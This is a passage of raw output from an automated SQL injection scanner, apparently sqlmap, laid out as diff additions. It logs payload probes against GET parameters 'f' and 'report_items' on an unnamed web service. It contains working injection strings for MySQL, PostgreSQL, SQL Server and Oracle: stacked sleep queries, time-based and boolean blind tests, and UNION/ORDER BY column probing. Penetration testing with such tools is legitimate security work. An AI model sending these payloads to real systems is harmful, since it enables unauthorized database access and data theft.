+[16:23:48] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - ORDER BY clause' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Oracle error-based - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Firebird error-based - ORDER BY clause' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'IBM DB2 error-based - ORDER BY clause' because the level (5) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)' because the level (2) is higher than the provided (1)
+
+[16:23:48] [INFO] testing 'Generic inline queries'
+
+[16:23:48] [PAYLOAD] (SELECT CONCAT(CONCAT('qxvxq',(CASE WHEN (7889=7889) THEN '1' ELSE '0' END)),'qpvpq'))
+
+[16:23:48] [DEBUG] skipping test 'MySQL inline queries' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'PostgreSQL inline queries' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Microsoft SQL Server/Sybase inline queries' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Oracle inline queries' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'SQLite inline queries' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'Firebird inline queries' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'ClickHouse inline queries' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (comment)' because the level (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)' because the level (3) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP)' because the level (4) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:48] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK)' because the risk (2) is higher than the provided (1)
+
+[16:23:48] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+
+[16:23:48] [PAYLOAD] json');SELECT PG_SLEEP(5)--
+
+[16:23:48] [PAYLOAD] json';SELECT PG_SLEEP(5)--
+
+[16:23:48] [PAYLOAD] json);SELECT PG_SLEEP(5)--
+
+[16:23:49] [PAYLOAD] json;SELECT PG_SLEEP(5)--
+
+[16:23:49] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries' because the level (4) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc - comment)' because the level (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc)' because the level (5) is higher than the provided (1)
+
+[16:23:49] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+
+[16:23:49] [PAYLOAD] json');WAITFOR DELAY '0:0:5'--
+
+[16:23:49] [PAYLOAD] json';WAITFOR DELAY '0:0:5'--
+
+[16:23:49] [PAYLOAD] json);WAITFOR DELAY '0:0:5'--
+
+[16:23:49] [PAYLOAD] json;WAITFOR DELAY '0:0:5'--
+
+[16:23:49] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)' because the level (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries' because the level (4) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE)' because the level (5) is higher than the provided (1)
+
+[16:23:49] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+
+[16:23:49] [PAYLOAD] json');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(102)||CHR(87)||CHR(111),5) FROM DUAL--
+
+[16:23:49] [PAYLOAD] json';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(102)||CHR(87)||CHR(111),5) FROM DUAL--
+
+[16:23:49] [PAYLOAD] json);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(102)||CHR(87)||CHR(111),5) FROM DUAL--
+
+[16:23:49] [PAYLOAD] json;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(102)||CHR(87)||CHR(111),5) FROM DUAL--
+
+[16:23:49] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)' because the level (4) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'Oracle stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'Oracle stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)' because the level (4) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP)' because the level (5) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP - comment)' because the level (5) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP)' because the level (5) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'Firebird stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'Firebird stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+
+[16:23:49] [PAYLOAD] json') AND (SELECT 4440 FROM (SELECT(SLEEP(5)))bVjd) AND ('ASBE'='ASBE
+
+[16:23:49] [PAYLOAD] json' AND (SELECT 4440 FROM (SELECT(SLEEP(5)))bVjd) AND 'YGPC'='YGPC
+
+[16:23:49] [PAYLOAD] json) AND (SELECT 4440 FROM (SELECT(SLEEP(5)))bVjd) AND (3817=3817
+
+[16:23:49] [PAYLOAD] json AND (SELECT 4440 FROM (SELECT(SLEEP(5)))bVjd)
+
+[16:23:49] [PAYLOAD] json AND (SELECT 4440 FROM (SELECT(SLEEP(5)))bVjd)-- PbFx
+
+[16:23:49] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)' because the risk (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP)' because the level (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' because the risk (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)' because the level (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)' because the level (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)' because the risk (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind' because the level (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (comment)' because the level (4) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)' because the level (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)' because the level (4) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL AND time-based blind (ELT)' because the level (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL OR time-based blind (ELT)' because the risk (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL AND time-based blind (ELT - comment)' because the level (5) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'MySQL OR time-based blind (ELT - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:49] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+
+[16:23:49] [PAYLOAD] json') AND 8770=(SELECT 8770 FROM PG_SLEEP(5)) AND ('uaOP'='uaOP
+
+[16:23:49] [PAYLOAD] json' AND 8770=(SELECT 8770 FROM PG_SLEEP(5)) AND 'NVbD'='NVbD
+
+[16:23:49] [PAYLOAD] json) AND 8770=(SELECT 8770 FROM PG_SLEEP(5)) AND (9948=9948
+
+[16:23:49] [PAYLOAD] json AND 8770=(SELECT 8770 FROM PG_SLEEP(5))
+
+[16:23:49] [PAYLOAD] json AND 8770=(SELECT 8770 FROM PG_SLEEP(5))-- Xovd
+
+[16:23:49] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind' because the risk (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind (comment)' because the level (4) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind (comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:49] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+
+[16:23:49] [PAYLOAD] json') WAITFOR DELAY '0:0:5' AND ('VXQL'='VXQL
+
+[16:23:49] [PAYLOAD] json' WAITFOR DELAY '0:0:5' AND 'vOSs'='vOSs
+
+[16:23:49] [PAYLOAD] json) WAITFOR DELAY '0:0:5' AND (7785=7785
+
+[16:23:49] [PAYLOAD] json WAITFOR DELAY '0:0:5'
+
+[16:23:49] [PAYLOAD] json WAITFOR DELAY '0:0:5'-- MRMr
+
+[16:23:49] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF - comment)' because the level (4) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:49] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:49] [INFO] testing 'Oracle AND time-based blind'
+
+[16:23:49] [PAYLOAD] json') AND 3002=DBMS_PIPE.RECEIVE_MESSAGE(CHR(121)||CHR(74)||CHR(69)||CHR(119),5) AND ('uObf'='uObf
+
+[16:23:49] [PAYLOAD] json' AND 3002=DBMS_PIPE.RECEIVE_MESSAGE(CHR(121)||CHR(74)||CHR(69)||CHR(119),5) AND 'RJXs'='RJXs
+
+[16:23:50] [PAYLOAD] json) AND 3002=DBMS_PIPE.RECEIVE_MESSAGE(CHR(121)||CHR(74)||CHR(69)||CHR(119),5) AND (8966=8966
+
+[16:23:50] [PAYLOAD] json AND 3002=DBMS_PIPE.RECEIVE_MESSAGE(CHR(121)||CHR(74)||CHR(69)||CHR(119),5)
+
+[16:23:50] [PAYLOAD] json AND 3002=DBMS_PIPE.RECEIVE_MESSAGE(CHR(121)||CHR(74)||CHR(69)||CHR(119),5)-- VzhD
+
+[16:23:50] [DEBUG] skipping test 'Oracle OR time-based blind' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Oracle AND time-based blind (comment)' because the level (4) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Oracle OR time-based blind (comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Informix AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Informix OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Informix AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Informix OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'ClickHouse AND time-based blind (heavy query)' because the level (4) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'ClickHouse OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace' because the level (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' because the level (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (bool)' because the level (4) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (ELT)' because the level (5) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (MAKE_SET)' because the level (5) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - Parameter replace' because the level (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'PostgreSQL time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)' because the level (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)' because the level (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (heavy queries)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Firebird time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'SAP MaxDB time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'IBM DB2 time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Informix time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)' because the level (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)' because the level (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the risk (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the risk (2) is higher than the provided (1)
+
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+
+[16:23:50] [DEBUG] used the default behavior, running in batch mode
+
+[16:23:50] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+
+[16:23:50] [PAYLOAD] json') ORDER BY 1-- QKWu
+
+[16:23:50] [PAYLOAD] json') ORDER BY 7521-- Mqli
+
+[16:23:50] [PAYLOAD] json' ORDER BY 1-- DBQG
+
+[16:23:50] [PAYLOAD] json' ORDER BY 8788-- kqDO
+
+[16:23:50] [PAYLOAD] json) ORDER BY 1-- ZIPY
+
+[16:23:50] [PAYLOAD] json) ORDER BY 5977-- nmwM
+
+[16:23:50] [PAYLOAD] json ORDER BY 1-- SHIz
+
+[16:23:50] [PAYLOAD] json ORDER BY 4324-- eXFH
+
+[16:23:50] [PAYLOAD] json ORDER BY 1-- XvOA
+
+[16:23:50] [PAYLOAD] json ORDER BY 9351-- KgxC
+
+[16:23:50] [DEBUG] skipping test 'Generic UNION query (random number) - 1 to 10 columns' because the level (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Generic UNION query (NULL) - 11 to 20 columns' because the level (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Generic UNION query (random number) - 11 to 20 columns' because the level (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Generic UNION query (NULL) - 21 to 30 columns' because the level (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Generic UNION query (random number) - 21 to 30 columns' because the level (4) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Generic UNION query (NULL) - 31 to 40 columns' because the level (4) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Generic UNION query (random number) - 31 to 40 columns' because the level (5) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Generic UNION query (NULL) - 41 to 50 columns' because the level (5) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'Generic UNION query (random number) - 41 to 50 columns' because the level (5) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL UNION query (NULL) - 1 to 10 columns' because the level (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL UNION query (random number) - 1 to 10 columns' because the level (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL UNION query (NULL) - 11 to 20 columns' because the level (2) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL UNION query (random number) - 11 to 20 columns' because the level (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL UNION query (NULL) - 21 to 30 columns' because the level (3) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL UNION query (random number) - 21 to 30 columns' because the level (4) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL UNION query (NULL) - 31 to 40 columns' because the level (4) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL UNION query (random number) - 31 to 40 columns' because the level (5) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL UNION query (NULL) - 41 to 50 columns' because the level (5) is higher than the provided (1)
+
+[16:23:50] [DEBUG] skipping test 'MySQL UNION query (random number) - 41 to 50 columns' because the level (5) is higher than the provided (1)
+
+[16:23:50] [WARNING] GET parameter 'f' does not seem to be injectable
+
+[16:23:50] [INFO] testing if GET parameter 'report_items' is dynamic
+
+[16:23:50] [PAYLOAD] 5981
+
+[16:23:50] [DEBUG] setting match ratio for current parameter to 0.966
+
+[16:23:50] [INFO] GET parameter 'report_items' appears to be dynamic
+
+[16:23:50] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}],,.((),".'
+
+[16:23:50] [WARNING] heuristic (basic) test shows that GET parameter 'report_items' might not be injectable
+
+[16:23:50] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]'WEhSlw<'">zQReAZ
+
+[16:23:50] [INFO] testing for SQL injection on GET parameter 'report_items'
+
+[16:23:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+
+[16:23:50] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]) AND 1227=6099 AND (5865=5865
+
+[16:23:50] [DEBUG] setting match ratio for current parameter to 0.949
+
+[16:23:50] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]) AND 7081=7081 AND (5568=5568
+
+[16:23:50] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND 1559=9060
+
